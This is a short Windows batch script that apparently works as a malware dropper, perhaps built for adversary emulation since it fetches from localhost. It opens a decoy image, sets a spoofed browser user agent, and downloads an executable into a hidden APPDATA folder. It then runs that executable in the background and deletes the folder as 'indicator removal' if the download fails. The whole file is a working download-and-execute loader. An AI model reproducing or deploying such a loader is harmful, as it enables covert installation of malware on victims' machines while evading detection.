@echo off
setlocal

:: open the decoy file
start "" "./bird3.jpg.png"

:: useragent
set UserAgent=Mozilla/5.0 (Windows NT 10.0; Wln64; x64; rv:121.0) Gecko/20100101 Firefox/121.0

:: create folder in APPDATA
set ZestyChipsFolder=%APPDATA%\ZestyChips
mkdir "%ZestyChipsFolder%"

:: download the file to APPDATA
curl -A "%UserAgent%" -o "%ZestyChipsFolder%\ZestyChipsFromURL.exe" http://localhost/index.php

:: error downloading, indicator removal and quit
if %errorlevel% neq 0 (
    rmdir /s /q "%ZestyChipsFolder%"
    exit /b
)

:: check file exists (i.e. successful download) if not exit
if not exist "%ZestyChipsFolder%\ZestyChipsFromURL.exe" (
    :: indicator removal and exit
    rmdir /s /q "%ZestyChipsFolder%"
    exit /b
)

:: execute in background
start /b "" "%ZestyChipsFolder%\ZestyChipsFromURL.exe"

endlocal